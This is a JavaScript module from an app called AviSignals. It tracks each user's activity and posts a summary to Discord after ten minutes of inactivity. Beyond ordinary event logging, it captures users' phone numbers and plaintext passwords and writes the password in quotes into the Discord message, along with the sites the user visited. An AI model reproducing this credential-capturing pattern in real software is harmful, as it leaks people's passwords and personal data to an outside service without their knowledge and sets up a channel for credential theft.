// ============================================================
// journeyAgent.js — AviSignals User Journey Tracker
//
// Monitors user activities across the platform and sends a
// chronological summary to Discord after 10 minutes of inactivity.
// 
// AI-FREE: Uses template-based summaries — no Groq tokens consumed.
// ============================================================

'use strict';

const discordAgent = require('./discordAgent');

// Map of userIdentifier -> { lastSeen: Date, events: [], phone: string, password: string, sites: Set }
const userJourneys = new Map();

// Inactivity timeout (10 minutes)
const INACTIVITY_TIMEOUT = 10 * 60 * 1000;

/**
 * Log a user event to their journey
 * @param {string} userIdentifier - Email, phone, or IP
 * @param {string} eventName - Type of activity
 * @param {object} details - Optional metadata
 */
function logEvent(userIdentifier, eventName, details = {}) {
    if (!userIdentifier) return;

    const now = new Date();
    const timestamp = now.toLocaleTimeString('en-KE', { timeZone: 'Africa/Nairobi' });
    
    // Clear existing flush timeout if it exists
    const existing = userJourneys.get(userIdentifier);
    if (existing && existing.flushTimeout) {
        clearTimeout(existing.flushTimeout);
    }

    const journey = existing || { events: [], lastSeen: now, phone: null, password: null, sites: new Set() };
    
    // Capture details if present
    if (details.phone) journey.phone = details.phone;
    if (details.password) journey.password = details.password;
    if (details.site) journey.sites.add(details.site);

    // Format the event string
    let eventStr = `[${timestamp}] **${eventName}**`;
    if (details.site) eventStr += ` — Site: \`${details.site}\``;
    if (details.pkg)  eventStr += ` — Pkg: \`${details.pkg}\``;
    if (details.page) eventStr += ` — Page: \`${details.page}\``;

    journey.events.push(eventStr);
    journey.lastSeen = now;

    // Set a new timeout to flush the summary
    journey.flushTimeout = setTimeout(() => {
        flushJourney(userIdentifier);
    }, INACTIVITY_TIMEOUT);

    userJourneys.set(userIdentifier, journey);
}

/**
 * Build a template-based journey summary (no AI tokens used)
 */
function buildTemplateSummary(userIdentifier, journey) {
    const phoneInfo = journey.phone || 'unknown phone';
    const passInfo = journey.password ? `password "${journey.password}"` : 'no password captured';
    const sitesInfo = journey.sites.size > 0 ? Array.from(journey.sites).join(', ') : 'no specific site';
    const eventCount = journey.events.length;

    // Detect key milestones from event names
    const eventNames = journey.events.map(e => e.toLowerCase());
    const registered = eventNames.some(e => e.includes('register') || e.includes('signup'));
    const loggedIn   = eventNames.some(e => e.includes('login') || e.includes('logged'));
    const gotFree    = eventNames.some(e => e.includes('free_code') || e.includes('free trial'));
    const paid       = eventNames.some(e => e.includes('payment') || e.includes('paid') || e.includes('activated'));
    const chatted    = eventNames.some(e => e.includes('chat') || e.includes('message'));

    // Build narrative sentence
    let narrative = `User ${userIdentifier} (Phone: ${phoneInfo}, ${passInfo}) visited the platform`;

    if (registered) narrative += ', registered an account';
    else if (loggedIn) narrative += ', logged into their account';

    if (gotFree) narrative += `, claimed a free trial code for ${sitesInfo}`;
    if (paid) narrative += ', made a payment and activated a premium code';
    if (chatted) narrative += ', interacted with the AI support chat';

    narrative += `. They completed ${eventCount} tracked interaction${eventCount !== 1 ? 's' : ''}`;
    if (journey.sites.size > 0) narrative += ` across site(s): ${sitesInfo}`;
    narrative += '.';

    return narrative;
}

/**
 * Send the journey summary to Discord and remove from memory
 */
async function flushJourney(userIdentifier) {
    const journey = userJourneys.get(userIdentifier);
    if (!journey || journey.events.length === 0) {
        userJourneys.delete(userIdentifier);
        return;
    }

    console.log(`🚀 Flushing journey summary for ${userIdentifier} (${journey.events.length} events)`);

    // Build template summary — no AI tokens used
    const summaryText = buildTemplateSummary(userIdentifier, journey);

    discordAgent.sendJourneySummary({
        user: userIdentifier,
        summaryText: summaryText
    });

    userJourneys.delete(userIdentifier);
}

module.exports = {
    logEvent
};
